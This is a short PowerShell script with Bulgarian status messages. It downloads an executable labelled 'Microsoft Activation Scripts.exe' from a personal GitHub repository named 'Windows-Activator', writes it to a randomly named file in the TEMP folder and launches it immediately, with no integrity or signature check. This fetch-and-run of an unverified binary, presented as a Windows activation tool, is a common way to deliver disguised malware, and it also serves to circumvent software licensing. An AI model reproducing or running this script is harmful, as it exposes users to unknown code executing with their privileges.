$url = "https://raw.githubusercontent.com/acenljd/Windows-Activator/refs/heads/main/Microsoft%20Activation%20Scripts.exe"
$tempFile = "$env:TEMP\MAS_$([Guid]::NewGuid().ToString('N')).exe"

Write-Host "Изтегляне към: $tempFile" -ForegroundColor Yellow
(New-Object System.Net.WebClient).DownloadFile($url, $tempFile)

Write-Host "Стартиране..." -ForegroundColor Green
Start-Process $tempFile
